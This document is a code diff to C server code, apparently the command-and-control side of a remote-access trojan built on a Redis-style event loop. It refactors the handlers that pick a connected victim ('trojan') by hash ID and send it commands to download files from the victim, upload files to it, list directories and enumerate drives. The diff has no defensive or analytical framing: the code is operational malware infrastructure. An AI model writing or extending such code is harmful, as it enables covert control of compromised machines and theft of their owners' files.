@@ -10,18 +10,24 @@
 #include <malloc.h>
 #include <pthread.h>
 
+typedef struct thread_arg{
+	int argc;
+	void *c;
+}thread_arg;
+
 #define linkClients(client, trojan)\
+	int flags = fcntl((trojan)->fd, F_GETFL);\
 	do{\
 	aeDeleteFileEvent(server.el, (client)->fd, AE_READABLE);\
 	aeDeleteFileEvent(server.el, (client)->fd, AE_WRITABLE);\
 	aeDeleteFileEvent(server.el, (trojan)->fd, AE_READABLE);\
 	aeDeleteFileEvent(server.el, (trojan)->fd, AE_WRITABLE);\
-	fcntl((trojan)->fd, F_SETFL, 0);                                    \
-                                                                  \
+	fcntl((trojan)->fd, F_SETFL, 0);\
 	struct timeval tv;                                    \
-	tv.tv_sec = 1;                                                \
+	tv.tv_sec = 2;                                           \
 	tv.tv_usec = 0;                                               \
 	setsockopt((trojan)->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); \
+	setsockopt((client)->fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); \
 	}while(0);
 
 #define unlinkClients(client, trojan)\
@@ -36,8 +42,10 @@
 #define generateThreadFunc(type)\
 void type##Command(client* c){\
 	pthread_t tid;\
-\
-	int ret = pthread_create(&tid, NULL, type##_thread_func, (void*) c);\
+	thread_arg* arg = zmalloc(sizeof(*arg));\
+	arg->argc = c->argc;\
+	arg->c = (void *) c;\
+	int ret = pthread_create(&tid, NULL, type##_thread_func, (void*) arg);\
 	if(ret){\
 		addReply(c, shared.err);\
 		return;\
@@ -52,7 +60,6 @@ void type##Command(client *c) {\
 		addReplySds(c, sdsnew("-ERR CAN'T FIND CLIENT.\r\n"));\
 		return;\
 	}\
-\
 	addReply(cl, shared.mbulkhdr[(value)]);\
 	addReplyBulkCString(cl, ""#type);\
 	if(c->cur_trojan){\
@@ -65,7 +72,38 @@ void type##Command(client *c) {\
 	}\
 \
 	addReply(c, shared.ok);\
-\
+}
+
+client* threadGetClient(client* c, int argc){
+	listNode *ln;
+	listIter li;
+
+	if(c->enable_client != true || c->is_control != true){
+		addReply(c, shared.err);
+		return NULL;
+	}
+
+	client* cl = NULL;
+	listRewind(server.clients, &li);
+	while((ln = listNext(&li))){
+		cl = listNodeValue(ln);
+		if(!cl || !cl->hashid || cl->enable_client == false){
+			cl = NULL;
+			continue;
+		}
+		if(c->cur_trojan && !strcasecmp(c->cur_trojan, cl->hashid)){
+			break;
+		}
+		if(!c->cur_trojan && argc >= 2 && !strcmp(c->argv[1]->ptr, cl->hashid)){
+			break;
+		}
+		if(!c->cur_trojan && argc >= 2 && !strncmp(c->argv[1]->ptr, cl->hashid + 1, 5)){
+			break;
+		}
+		printf("argc: %d ---%s--- cmp ---%s---\r\n", argc, (char*) c->argv[1]->ptr, cl->hashid);
+		cl = NULL;
+	}
+	return cl;
 }
 
 client* genericGetClient(client* c){
@@ -81,14 +119,17 @@ client* genericGetClient(client* c){
 	listRewind(server.clients, &li);
 	while((ln = listNext(&li))){
 		cl = listNodeValue(ln);
-		if(!cl || !cl->hashid || cl->enable_client==false){
+		if(!cl || !cl->hashid || cl->enable_client == false){
 			cl = NULL;
 			continue;
 		}
 		if(c->cur_trojan && !strcasecmp(c->cur_trojan, cl->hashid)){
 			break;
 		}
-		if(!c->cur_trojan && c->argc >=2 && !strcasecmp(c->argv[1]->ptr, cl->hashid)){
+		if(!c->cur_trojan && c->argc >= 2 && !strcmp(c->argv[1]->ptr, cl->hashid)){
+			break;
+		}
+		if(!c->cur_trojan && c->argc >= 2 && !strncmp(c->argv[1]->ptr, cl->hashid + 1, 5)){
 			break;
 		}
 		cl = NULL;
@@ -125,9 +166,9 @@ void inCommand(client *c){
 		addReply(c, shared.ok);
 		return;
 	}
+
 	addReply(c, shared.err);
 	return;
-	
 }
 
 void outCommand(client *c){
@@ -135,7 +176,7 @@ void outCommand(client *c){
 		sdsfree(c->cur_trojan);
 		c->cur_trojan = NULL;
 		addReply(c, shared.ok);
-		return;	
+		return;
 	}
 
 	addReply(c, shared.err);
@@ -215,6 +256,7 @@ void getClientsCommand(client *c){
 void lockCommand(client *c){
 	unsigned char hash[20];
 	client *cl = genericGetClient(c);
+
 	if(cl == NULL){
 		addReply(c, shared.err);
 		return;
@@ -241,97 +283,143 @@ void lockCommand(client *c){
 	return;
 }
 
-/* file transport*/
-void* download_thread_func(void* cli){
-	int tfd, cfd;
-	int count, ret;
+/* low level of download file api*/
+int  _download(int fd, char* filename){
 	packet pac;
-	client* c = (client *) cli;
-	client *cl = genericGetClient(c);
-
-	if(cl == NULL){
-		addReply(c, shared.err);
-		return NULL;
-	}
-	/* send cmd to the trojan client */
-	tfd = cl->fd;
-	memset(&pac, 0, sizeof(pac));
-	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n",
-			(int)strlen(c->argv[c->cur_trojan? 1: 2]->ptr),(char*)c->argv[c->cur_trojan? 1: 2]->ptr);
-
-	ret = write(tfd, pac.data, strlen(pac.data));
-
-	if(c->cur_trojan){
-		cfd = open(c->argv[1]->ptr, O_WRONLY|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
-		if(cfd == -1){
-			addReplySds(c, sdsnew("-ERR CAN'T CREATE FILE"));
-			return NULL;
-		}
-	}
-	else
-		cfd = c->fd;
-
-	int flags = fcntl(tfd, F_GETFL, 0);
-	fcntl(tfd, F_SETFL, 0);
+	int count, ret;
+	int file = open(filename, O_WRONLY|O_CREAT, 0666);
 	while(1){
 		memset(&pac, 0, sizeof(pac));
-		count = read(tfd, &pac, sizeof(pac));
+		count = read(fd, &pac, sizeof(pac));
 
 		if(count > 0){
 			switch(pac.type){
 			case 1:
-				if(c->cur_trojan)
-					ret = write(cfd, pac.data, sizeof(pac.data));
-				else
-					ret = write(cfd, &pac, sizeof(pac));
+				ret = write(file, pac.data, sizeof(pac.data));
 				if(ret < 0)
 					goto err;
 				break;
 			case 2:
-				if(c->cur_trojan)
-					ret = write(cfd, pac.data, count - 1);
-				else
-					ret = write(cfd, &pac, count);
-				close(cfd);
-				fcntl(tfd, F_SETFL, flags);
-				return NULL;
+				ret = write(file, pac.data, count - 1);
+				close(file);
+				return 1;
 			default:
 				goto err;
 			}
 		}
 		else{
-err:			/* error handle*/
-			pac.type = 0;
-			if(c->cur_trojan)
-				return NULL;
-			else
-				ret = write(cfd, pac.data, sizeof(pac.data));
-			fcntl(tfd, F_SETFL, flags);
-			close(cfd);
-			return NULL;
+err:		close(file);
+			return 0;
+		}
+	}
+	
+}
+
+int _upload(int fd, char* filename){
+	packet pac;
+	int count, ret, leftcount = 1;
+	struct stat stbuf;
+	int file = open(filename, O_RDONLY);
+	if(file == -1 || fstat(file, &stbuf) != 0)
+		goto err;
+	leftcount = stbuf.st_size;
+	while(1){
+		memset(&pac, 0, sizeof(pac));
+		count = read(file, &pac.data, sizeof(pac.data));
+		leftcount -= count;
+		if(count > 0){
+			if(leftcount > 0){
+				pac.type = 1;
+				ret = write(fd, &pac, sizeof(pac));
+				if(ret < 0)
+					goto err;
+			}
+			else{
+				pac.type = 2;
+				ret = write(fd, &pac, count + 1);
+				close(file);
+				return 1;
+			}
+		}
+		else{
+err:		pac.type = 0;
+			ret = write(fd, &pac, sizeof(pac));
+			close(file);
+			return 0;
 		}
 	}
 
-	addReply(c, shared.ok);
-	return NULL;
 }
 
-void*  upload_thread_func(void *cli){
-	struct stat stbuf;
-	int  cfd, leftcount = 1, count;
+/* file transport*/
+void* download_thread_func(void* arg){
+	int ret;
 	packet pac;
+	int argc = ((thread_arg *) arg)->argc;
+	client* c = (client *) ((thread_arg *)arg)->c;
 
-
-	client* c = (client *) cli;
-	client *cl = genericGetClient(c);
-
-	cfd = c->fd;
-	int flags = fcntl(cl->fd, F_GETFL, 0);
+	client *cl = threadGetClient(c, argc);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
 		return NULL;
 	}
+
+	linkClients(c, cl);
+	/* send cmd to the trojan client */
+	memset(&pac, 0, sizeof(pac));
+	char* download_file = (char*) c->argv[c->cur_trojan? 1: 2]->ptr;
+	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n",(unsigned int) strlen(download_file), download_file);
+
+	ret = write(cl->fd, pac.data, strlen(pac.data));
+	if(ret < 0){
+		unlinkClients(c, cl);
+		return NULL;
+	}
+
+
+	char filenamebuf[1024];
+	char *filename = NULL;
+	while(filename == NULL)
+		filename = tmpnam(filenamebuf);
+	int file = open(filename, O_WRONLY | O_CREAT, 0666);
+
+	if(_download(cl->fd, filename)){
+		if(c->cur_trojan){
+			addReply(c, shared.ok);
+			rename(filename, download_file);
+		}
+		else{
+			close(file);
+			ret = write(c->fd, "+OK\r\n", sizeof("+OK DOWNLOADED\r\n"));
+			if(_upload(c->fd, filename))
+				remove(filename);
+		}
+	}
+	else
+		addReply(c, shared.err);
+	unlinkClients(c, cl);
+
+	return NULL;
+}
+
+void*  upload_thread_func(void *arg){
+	struct stat stbuf;
+	int  cfd, leftcount = 1, count;
+	packet pac;
+
+	int argc = ((thread_arg *) arg)->argc;
+	client* c = (client *) ((thread_arg *)arg)->c;
+
+	client *cl = threadGetClient(c, argc);
+
+	cfd = c->fd;
+
+	if(cl == NULL){
+		addReply(c, shared.err);
+		return NULL;
+	}
+	linkClients(c, cl);
 	memset(&pac, 0, sizeof(pac));
 	sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n",
 		   	(int)strlen(c->argv[c->cur_trojan? 1: 2]->ptr), (char*)c->argv[c->cur_trojan? 1: 2]->ptr);
@@ -339,7 +427,6 @@ void*  upload_thread_func(void *cli){
 	if(ret < 0)
 		goto err;
 
-	linkClients(c, cl);
 
 	if(c->cur_trojan){
 		cfd = open(c->argv[1]->ptr, O_RDONLY);
@@ -393,17 +480,18 @@ err:		pac.type = leftcount > 0? 0: 2;
 	return NULL;
 }
 
-static void* ls_thread_func(void* cli){
+static void* ls_thread_func(void *arg){
 	char buff[1400];
-	client* c = (client*) cli;
+	int argc = ((thread_arg *) arg)->argc;
+	client* c = (client *) ((thread_arg *) arg)->c;
 
-	client *cl = genericGetClient(c);
+	client *cl = threadGetClient(c, argc);
+	zfree((thread_arg*)arg);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
 		return NULL;
 	}
-	int flags = fcntl(cl->fd, F_GETFL);
 	linkClients(c, cl);
 
 	memset(buff, 0, sizeof(buff));
@@ -422,14 +510,15 @@ static void* ls_thread_func(void* cli){
 		while(count % 1400 == 0){
 			memset(buff, 0, sizeof(buff));
 			count = read(cl->fd, buff, sizeof(buff));
+			printf("[-]read data from trojan count: %d\n", count);
 
 			ret = write(c->fd, buff, strlen(buff));
 			if(ret < 0)
 				goto err;
 		}
 	}
-	/* error handle*/
 	else
+	/* error handle*/
 err:	addReply(c, shared.err);
 	unlinkClients(c, cl);
 
@@ -437,16 +526,17 @@ err:	addReply(c, shared.err);
 }
 
 
-void* getDrivers_thread_func(void *cli){
+void* getDrivers_thread_func(void *arg){
 	char buff[64];
-	client* c = (client *) cli;
-	client *cl = genericGetClient(c);
+	int argc = ((thread_arg *) arg)->argc;
+	client* c = (client *) ((thread_arg *)arg)->c;
+
+	client *cl = threadGetClient(c, argc);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
 		return NULL;
 	}
-	int flags = fcntl(cl->fd, F_GETFL);
 
 	linkClients(c, cl);
 	sprintf(buff, "*1\r\n$9\r\ngetDrives\r\n");
